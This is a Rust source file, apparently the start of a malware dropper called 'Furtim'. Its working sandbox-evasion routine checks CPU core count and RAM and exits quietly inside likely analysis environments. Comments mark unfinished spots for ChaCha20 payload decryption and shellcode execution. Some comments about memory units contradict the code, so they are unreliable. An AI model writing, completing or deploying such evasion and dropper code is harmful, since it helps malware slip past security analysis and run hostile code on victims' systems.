use std::process;
use sysinfo::{System, SystemExt};

// --- Evasion-Checks ---
// Required cores: Realistic value > 2 to bypass sandboxes.
const MIN_CPUS: usize = 4; 
// 8 GB RAM in bytes. We use 7 GB as a minimum to allow for some headroom.
const MIN_RAM_BYTES: u64 = 7 * 1024 * 1024 * 1024; // 7 GB in bytes because sysinfo gives in KB

/// Performs various system checks to detect sandbox environments.
/// 
/// Returns `true` if all checks are passed, `false` otherwise.
fn run_evasion_checks() -> bool {
    eprintln!("[*] Furtim: Starte Evasion-Checks..."); // Debug-output
    
    // 1. CPU-Core Check
    let available_cpus = num_cpus::get();
    eprintln!("    [-] Found CPU cores: {}", available_cpus);

    if available_cpus < MIN_CPUS {
        eprintln!("[!] Evasion Triggered: CPU cores too low ({})", available_cpus); // Debug-output
        return false;
    }

    // 2. RAM Check
    // Create system instance and update storage data
    let mut sys = System::new_all(); // All Information
    sys.refresh_memory();
    
    // Allocate total memory in GB for easier reading
    let total_memory = sys.total_memory(); 
    let total_memory_gb = total_memory as f64 / 1024.0 / 1024.0 / 1024.0; // Convert to GB because sysinfo gives in KB - divide by 1024 twice
    
    eprintln!("    [-] Found RAM: {:.2} GB", total_memory_gb); // Debug-output with 2 decimal places

    if total_memory < MIN_RAM_BYTES {
        eprintln!("[!] Evasion triggered: RAM to low ({:.2} GB)", total_memory_gb);
        return false;
    }

    // Here you can add more evasion checks as needed - time checks, process checks, etc.
    
    eprintln!("[+] Evasion successful. Continue. ");
    true
}

fn main() {
    // The dropper's first critical decision
    if !run_evasion_checks() {
        // If evasion fails: End the program harmlessly and quietly.
        // process::exit(0) returns the value 0, which terminates normally.
        process::exit(0); 
    }
    
    // --- Phase 1: Decryption and Hiding ---
    // THE DECODING LOGIC FOLLOWS HERE WITH CHACHA20
    
    // --- Phase 3: Syscalls and Execution ---
    // THE SHELL CODE EXECUTION FOLLOWS HERE
    
    eprintln!("[!] Furtim: Programm exit.");
}